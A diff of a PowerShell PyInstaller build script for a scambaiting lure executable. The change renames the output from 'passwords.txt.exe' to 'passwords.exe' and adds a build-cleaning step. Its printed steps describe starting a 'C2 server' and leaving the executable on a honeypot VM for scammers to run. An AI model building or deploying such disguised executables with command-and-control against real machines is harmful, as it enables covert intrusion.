@@ -24,10 +24,22 @@ if ($Dev) {
 }
 
 # ============================================
+# CLEAN PREVIOUS BUILD
+# ============================================
+
+if (Test-Path "dist") {
+    Write-Host "Cleaning previous build..." -ForegroundColor Cyan
+    Remove-Item "dist" -Recurse -Force
+    Write-Host "  -> dist/ folder cleaned" -ForegroundColor Gray
+}
+
+Write-Host ""
+
+# ============================================
 # BUILD .EXE
 # ============================================
 
-Write-Host "Building passwords.txt.exe..."
+Write-Host "Building passwords.exe..."
 Write-Host ""
 
 # Check required files
@@ -68,7 +80,7 @@ if ($Dev) {
         --onefile `
         --console `
         --icon=icon.ico `
-        --name=passwords.txt `
+        --name=passwords `
         --clean `
         launcher.py
 } else {
@@ -76,7 +88,7 @@ if ($Dev) {
         --onefile `
         --noconsole `
         --icon=icon.ico `
-        --name=passwords.txt `
+        --name=passwords `
         --clean `
         launcher.py
 }
@@ -87,7 +99,7 @@ if ($LASTEXITCODE -ne 0) {
 }
 
 Write-Host ""
-Write-Host "  -> dist\passwords.txt.exe created" -ForegroundColor Green
+Write-Host "  -> dist\passwords.exe created" -ForegroundColor Green
 
 # Create or remove .dev_mode marker
 if ($Dev) {
@@ -116,20 +128,20 @@ if ($Dev) {
     Write-Host "======================================"
     Write-Host ""
     Write-Host "Dev build created with VISIBLE console." -ForegroundColor Yellow
-    Write-Host "Run dist\passwords.txt.exe to see debug output." -ForegroundColor Yellow
+    Write-Host "Run dist\passwords.exe to see debug output." -ForegroundColor Yellow
 } else {
     Write-Host "  Build Complete!"
     Write-Host "======================================"
     Write-Host ""
-    Write-Host "Output: dist\passwords.txt.exe"
+    Write-Host "Output: dist\passwords.exe"
 }
 Write-Host ""
 Write-Host "Next steps:"
 Write-Host "  1. Start C2 server: cd ..\sender && python sender.py"
 if ($Dev) {
-    Write-Host "  2. Run dist\passwords.txt.exe (console shows debug output)"
+    Write-Host "  2. Run dist\passwords.exe (console shows debug output)"
 } else {
-    Write-Host "  2. Deploy dist\passwords.txt.exe to honeypot VM"
+    Write-Host "  2. Deploy dist\passwords.exe to honeypot VM"
     Write-Host "  3. Wait for scammer to copy and execute"
 }
 Write-Host ""
